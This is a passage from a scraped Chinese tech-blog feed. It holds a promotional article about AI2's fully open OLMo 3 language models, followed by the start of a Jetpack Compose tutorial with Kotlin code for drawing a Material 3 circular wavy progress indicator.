<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.06.27-1024x537.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.06.27-1024x537.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f57080221324b83b30bd47df0c9da69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=jyjwWNt9RilWTcxl4AgameIpfRo%3D" alt="iShot_2025-11-24_22.06.27" loading="lazy"/></a></p>
<h3 data-id="heading-0">突破“黑箱”：全栈开源的震撼宣言</h3>
<p>以往我们谈论开源模型，往往指的是模型权重和一些基本代码。但OLMo 3，如同其名“Open Language Model”的终极演绎，直接将“透明度”提升到了前所未有的高度。AI2这次玩得更大，他们开放的是完整的“<strong>模型流程（Model Flow）</strong>”。</p>
<p>这意味着什么？</p>
<p>想象一下，你不再只是拿到了一张精美的蛋糕，而是获得了从面粉、鸡蛋到烘焙食谱、制作过程中的每一个检查点，甚至连你使用的烤箱型号和温度曲线都一清二楚。OLMo 3就是这样的“蛋糕”：它不仅提供70亿和320亿两种参数规模的模型权重，更慷慨地开源了：</p>
<ul>
<li><strong>完整的训练数据集 Dolma 3：</strong> 这是一个规模高达约6万亿token的庞大数据集，包含了网页、科学PDF、代码库等丰富内容。你能直接看到模型“吃”了什么。</li>
<li><strong>训练代码与详细配方：</strong> 你可以完全复现其训练过程。</li>
<li><strong>各阶段的训练检查点：</strong> 深入分析模型是如何一步步进化而来。</li>
</ul>
<p>这种“全栈开源”的哲学，对于学术研究、模型调试和负责任AI的发展而言，简直是福音。它让大模型不再是高高在上的“黑箱”，而是可以被深入剖析、理解和再创造的科学工具。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.06.50-1024x535.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.06.50-1024x535.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25135e302cf84115b4e6e71edcd072f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=7ShK0nJ2XaAUYb1jkRkWS5j8baI%3D" alt="iShot_2025-11-24_22.06.50" loading="lazy"/></a></p>
<h3 data-id="heading-1">性能与效率的“双料冠军”</h3>
<p>透明度之外，性能和效率是衡量大模型的硬指标。OLMo 3在这两点上也交出了令人惊喜的答卷。</p>
<p>根据官方数据，OLMo 3基础模型的训练效率比同规模的Meta Llama 3.1高出惊人的2.5倍。这背后是AI2在训练数据混合、模型架构和优化策略上的深度探索。更令人震撼的是，其32B规模的“Think”模型，在性能上足以对标甚至超越Qwen 3 32B这样的业界翘楚，但训练所用的token数量却仅为后者的六分之一。这意味着，AI2在更少的资源消耗下，达到了同等甚至更高的性能，这无疑是效率优化领域的一大突破。</p>
<p>在实际基准测试中，OLMo 3家族在多项综合能力测试中，与Qwen 2.5、Gemma 3、Llama 3.1等主流开源模型平分秋色，甚至在某些场景下表现更为出色。尤其在长上下文理解和代码能力方面，OLMo 3展现出独特的优势，与顶级模型不相上下。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.06.54-1024x319.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.06.54-1024x319.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/343d12185a0e49a1a761c9c74df4c191~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=NbrPuL6XbRR1hru4ctuRDHBCs7c%3D" alt="iShot_2025-11-24_22.06.54" loading="lazy"/></a></p>
<h3 data-id="heading-2">为应用场景量身定制的“模型家族”</h3>
<p>OLMo 3并非单打独斗，而是一个分工明确的家族，每个成员都针对特定任务进行了优化：</p>
<ul>
<li><strong>OLMo 3 Base（7B/32B）：</strong> 纯粹的基础模型，是那些希望从零开始定制或进行领域适配的开发者和研究者的完美起点。</li>
<li><strong>OLMo 3 Think（7B/32B）：</strong> 这款模型具备显式的思维链（Chain-of-Thought）能力，推理过程透明，是处理复杂逻辑分析、数学计算和代码生成的理想选择。如果你需要一个能“思考”的模型，非它莫属。</li>
<li><strong>OLMo 3 Instruct（7B）：</strong> 轻量而强大，它针对指令遵循、多轮对话和工具调用进行了深度优化，无论是作为日常智能助手，还是嵌入到应用程序中，都能游刃有余。</li>
<li><strong>OLMo 3 RL Zero（7B）：</strong> 这是一个专门为强化学习（RL）研究者打造的“干净底座”。它的训练数据与预训练数据分离，为RL算法的探索提供了极佳的可控环境。</li>
</ul>
<p>此外，OLMo 3全系列模型支持高达<strong>65,000个token</strong>的上下文长度，这相当于一次性处理一部短篇小说。对于需要分析长篇文档、法律合同、技术报告等任务的用户来说，这无疑是一项极具价值的突破。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.07.04-1024x921.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.07.04-1024x921.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bb71e88d790407fa007ca162fec009d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=rLo4bal%2FBQqu9GsPRLmf%2F%2F7V6lU%3D" alt="iShot_2025-11-24_22.07.04" loading="lazy"/></a></p>
<h3 data-id="heading-3">触手可及的未来</h3>
<p>AI2深知，再强大的模型，也需要便捷的获取和使用方式。因此，OLMo 3系列模型权重已在Hugging Face的<code>allenai/OLMo-3</code>项目下全部开源，方便开发者直接下载。如果你想先睹为快，AI2官方还提供了模型游乐场（Playground），让你无需任何配置，即可在线体验各个模型的魅力。</p>
<h3 data-id="heading-4">结语：新时代的开源宣言</h3>
<p>OLMo 3的发布，不仅仅是AI2在技术上的一次飞跃，更是他们对开源精神的深刻诠释。它向世界宣告：高性能与极致透明并非不可兼得。通过开放“模型流程”的每一个环节，AI2不仅提供了强大的工具，更搭建了一个前所未有的研究基础设施，有望极大推动AI科学的可复现性和创新速度。</p>
<p>在这个AI浪潮奔涌的时代，OLMo 3无疑是其中一道亮丽的风景线。它不仅让我们看到了未来开源大模型的形态，也为整个AI社区指明了一条更开放、更透明、更高效的前进之路。作为AI圈的一员，我对此充满期待，并相信它将在未来的AI发展中扮演举足轻重的角色。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.07.13-1024x670.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.07.13-1024x670.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aabef761a07248afb5f888ff8ce16d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=bMt6EUeYRCfMJYUuI4sqYleadjg%3D" alt="iShot_2025-11-24_22.07.13" loading="lazy"/></a></p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jetpack Compose 实战：复刻 Material 3 圆形波浪进度条]]></title>    <link>https://juejin.cn/post/7575897635138060288</link>    <guid>https://juejin.cn/post/7575897635138060288</guid>    <pubDate>2025-11-24T14:18:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635138060288" data-draft-id="7575090551357603892" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jetpack Compose 实战：复刻 Material 3 圆形波浪进度条"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2025-11-24T14:18:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨白"/> <meta itemprop="url" content="https://juejin.cn/user/2549135752044601"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jetpack Compose 实战：复刻 Material 3 圆形波浪进度条
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2549135752044601/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨白
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:18:44.000Z" title="Mon Nov 24 2025 14:18:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">效果</h2>
<p>要实现的效果是 Material 3 的 <code>CircularWavyProgressIndicator</code>。简单来说，就是一个带波浪的圆形进度条。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcomposables.com%2Fdocs%2Fandroidx.compose.material3%2Fmaterial3%2Fcomponents%2FCircularWavyProgressIndicator" target="_blank" title="https://composables.com/docs/androidx.compose.material3/material3/components/CircularWavyProgressIndicator" ref="nofollow noopener noreferrer">圆形波浪进度指示器</a></p>
<h2 data-id="heading-1">实现步骤</h2>
<h3 data-id="heading-2">绘制轨道和平滑波浪</h3>
<p>首先我们将轨道和“碾平”的波浪绘制出来。</p>
<p>对于普通圆弧，我们通常会使用 <code>DrawScope.drawArc()</code>。但我们需要绘制波浪，后续需要对每个点进行偏移，所以必须使用 <code>Path()</code> 来进行每个点的绘制。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep1</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary, <span class="hljs-comment">// 波浪颜色</span>
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer, <span class="hljs-comment">// 轨道颜色</span>
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp, <span class="hljs-comment">// 波浪笔触宽度</span>
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp, <span class="hljs-comment">// 轨道笔触宽度</span>
)</span></span> {
    <span class="hljs-comment">// 复用 Path 对象，避免重组时的重建导致内存抖动</span>
    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }

    <span class="hljs-keyword">val</span> density = LocalDensity.current
    <span class="hljs-comment">// 将 Dp 转为 Px</span>
    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-comment">// 采样：1度画一次</span>
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>

        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-comment">// 基础半径：容器宽的一半 - 笔触的一半，确保画笔不超出 Canvas 边界</span>
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span>

        <span class="hljs-comment">// --- 绘制波浪 ---</span>
        wavePath.rewind() <span class="hljs-comment">// 清空路径</span>
        <span class="hljs-keyword">val</span> endAngle = <span class="hljs-number">180f</span> <span class="hljs-comment">// 暂时画 180 度</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble()) <span class="hljs-comment">// 角度转弧度</span>

            <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) {
                wavePath.moveTo(x, y)
            } <span class="hljs-keyword">else</span> {
                wavePath.lineTo(x, y)
            }
        }
        drawPath(
            path = wavePath,
            color = waveColor,
            style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
        )

        <span class="hljs-comment">// --- 绘制轨道 ---</span>
        trackPath.rewind()
        <span class="hljs-keyword">val</span> trackStartAngle = endAngle
        <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

            <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) {
                <span class="hljs-comment">// 移到起始点</span>
                trackPath.moveTo(x, y)
            } <span class="hljs-keyword">else</span> {
                trackPath.lineTo(x, y)
            }
        }
        drawPath(
            path = trackPath,
            color = trackColor,
            style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
        )
    }
}
</code></pre>
<p>注意：</p>
<ol>
<li>为了避免在重组时，频繁创建 <code>Path</code> 对象导致内存抖动。我们使用了 <code>remember{ Path() }</code> 来复用路径对象。不过要在每次绘制前，调用 <code>rewind()</code> 清空已有路径。</li>
<li><code>sin()</code> 和 <code>cos()</code> 接收的都是弧度，需要调用 <code>Math.toRadians()</code>，将角度转为弧度。</li>
</ol>
<p>运行效果：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/345d233358e54b89aa146ac6ccb98f15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=Cb5yecsEaccEIcuc4G5LQBqr3Uo%3D" alt="image.png" width="50%" loading="lazy"/>
<h3 data-id="heading-3">绘制波浪线</h3>
<p>接下来，我们来给圆加上“褶皱”。原理也很简单，在计算半径时，叠加一个正弦函数即可。</p>
<p>公式：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mtext>基础半径</mtext><mo>+</mo><mtext>振幅</mtext><mo>×</mo><mi>sin</mi><mo>⁡</mo><mo stretchy="false">(</mo><mtext>弧度</mtext><mo>×</mo><mtext>频率</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R = \text{基础半径} + \text{振幅} \times \sin(\text{弧度} \times \text{频率})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord text"><span class="mord cjk_fallback">基础半径</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord text"><span class="mord cjk_fallback">振幅</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">sin</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">弧度</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord cjk_fallback">频率</span></span><span class="mclose">)</span></span></span></span></span></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep2</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary,
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer,
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    amplitude: <span class="hljs-type">Dp</span> = <span class="hljs-number">1.2</span>.dp, <span class="hljs-comment">// 振幅：决定波浪起伏的高度</span>
    wavelength: <span class="hljs-type">Dp</span> = <span class="hljs-number">15.</span>dp, <span class="hljs-comment">// 波长：决定波浪的密集程度</span>
)</span></span> {
    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }

    <span class="hljs-keyword">val</span> density = LocalDensity.current
    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> amplitudePx = with(density) { amplitude.toPx() }
    <span class="hljs-keyword">val</span> wavelengthPx = with(density) { wavelength.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>
        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-comment">// 注意：半径要额外减去振幅，防止波峰超出边界被截断</span>
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span> - amplitudePx

        <span class="hljs-comment">// --- 绘制波浪 ---</span>
        wavePath.rewind()

        <span class="hljs-comment">// 计算波浪的总周长和频率</span>
        <span class="hljs-keyword">val</span> circumference = <span class="hljs-number">2</span> * PI * baseRadius
        <span class="hljs-keyword">val</span> frequency = circumference / wavelengthPx

        <span class="hljs-keyword">val</span> endAngle = <span class="hljs-number">180f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

            <span class="hljs-comment">// 叠加正弦波偏移</span>
            <span class="hljs-keyword">val</span> waveOffset = amplitudePx * sin((rad * frequency))
            <span class="hljs-keyword">val</span> r = baseRadius + waveOffset

            <span class="hljs-keyword">val</span> x = center.x + (r * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (r * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) wavePath.moveTo(x, y) <span class="hljs-keyword">else</span> wavePath.lineTo(x, y)
        }
        drawPath(
            path = wavePath,
            color = waveColor,
            style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
        )

        <span class="hljs-comment">// --- 绘制轨道 ---</span>
        trackPath.rewind()
        <span class="hljs-keyword">val</span> trackStartAngle = endAngle
        <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

            <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) trackPath.moveTo(x, y) <span class="hljs-keyword">else</span> trackPath.lineTo(x, y)
        }
        drawPath(
            path = trackPath,
            color = trackColor,
            style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
        )
    }
}
</code></pre>
<p>运行效果：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/322bcbc85ade401d863bf61add2688ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=axypaX6yxzOnunbnMyxtpgppYlw%3D" alt="image.png" width="50%" loading="lazy"/>
<h3 data-id="heading-4">处理间隙</h3>
<p>可以看到，轨道和波浪重叠了。此时，我们可以添加一个 <code>gapSize</code>（间隙）。</p>
<p>其实也就是将间隙对应的弧长转成角度，在绘制时，省略这部分角度罢了。</p>
<p>不过，要考虑到 <code>StrokeCap.Round</code> 圆头笔触向外延伸的<strong>半个笔触宽度</strong>的半圆。</p>
<p>所以最终的弧长 = 期望的间隙 + 一个笔触宽度（两个半圆）</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep3</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary,
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer,
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    amplitude: <span class="hljs-type">Dp</span> = <span class="hljs-number">1.2</span>.dp,
    wavelength: <span class="hljs-type">Dp</span> = <span class="hljs-number">15.</span>dp,
    gapSize: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp, <span class="hljs-comment">// 间隙大小</span>
)</span></span> {
    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }
